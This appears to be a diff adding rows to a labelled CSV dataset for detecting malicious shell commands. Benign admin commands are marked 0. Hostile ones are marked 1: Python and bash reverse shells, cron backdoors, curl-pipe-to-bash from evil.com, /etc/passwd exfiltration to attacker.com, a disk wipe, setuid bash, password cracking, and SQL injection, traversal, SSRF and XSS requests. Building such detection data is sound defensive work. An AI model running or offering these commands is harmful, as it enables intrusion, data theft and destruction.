+2026-01-23 04:40:12,74.181.126.98,df -h,0
+2026-01-23 08:57:12,114.77.44.172,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 16:35:12,131.241.224.116,mkfs.ext4 /dev/sda1,1
+2026-01-23 09:44:12,65.106.92.250,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.2"",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",1
+2026-01-23 15:16:12,213.119.196.7,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
+2026-01-23 14:45:12,136.93.10.88,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 12:06:12,114.141.192.145,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
+2026-01-23 10:13:12,60.28.92.156,"curl ""http://target.com/login' AND 1=convert(int,(SELECT @@version))--""",1
+2026-01-23 03:00:12,62.13.246.118,systemctl status mysql,0
+2026-01-23 15:04:12,14.105.229.69,chmod 4777 /bin/bash,1
+2026-01-23 14:46:12,184.51.61.162,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 11:11:12,24.220.213.116,tar -czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://attacker.com/exfil,1
+2026-01-23 03:29:12,90.13.158.60,id,0
+2026-01-23 04:31:12,127.161.100.191,hostnamectl,0
+2026-01-23 06:57:12,209.237.66.38,ps aux | grep nginx,0
+2026-01-23 03:39:12,189.89.246.179,du -sh /var/www/*,0
+2026-01-23 02:46:12,64.166.220.33,ls -la /var/log/,0
+2026-01-23 10:32:12,54.127.36.152,"echo ""* * * * * /tmp/.backdoor.sh"" | crontab -",1
+2026-01-23 08:08:12,91.132.211.254,ip route show,0
+2026-01-23 09:00:12,189.129.40.138,ping -c 4 google.com,0
+2026-01-23 12:51:12,124.130.173.131,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 07:18:12,61.39.253.253,apt list --upgradable,0
+2026-01-23 02:37:12,113.239.186.17,df -h /,0
+2026-01-23 08:55:12,57.185.242.64,top -n 1 | head -20,0
+2026-01-23 02:57:12,32.184.176.110,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 11:23:12,108.125.180.22,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 08:23:12,95.206.250.98,cat /etc/nginx/nginx.conf,0
+2026-01-23 09:28:12,170.101.42.193,apt update,0
+2026-01-23 13:12:12,45.159.3.146,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 15:25:12,55.26.66.195,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 09:54:12,140.189.246.43,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.10.10"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 09:01:12,8.248.215.13,cat /proc/meminfo | head -10,0
+2026-01-23 03:32:12,147.57.32.124,apt list --upgradable,0
+2026-01-23 02:49:12,20.38.200.133,apt update && apt list --upgradable,0
+2026-01-23 13:08:12,43.65.131.165,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 13:17:12,76.107.190.214,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 09:30:12,27.210.64.70,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 06:58:12,62.146.132.87,logrotate -f /etc/logrotate.d/nginx,0
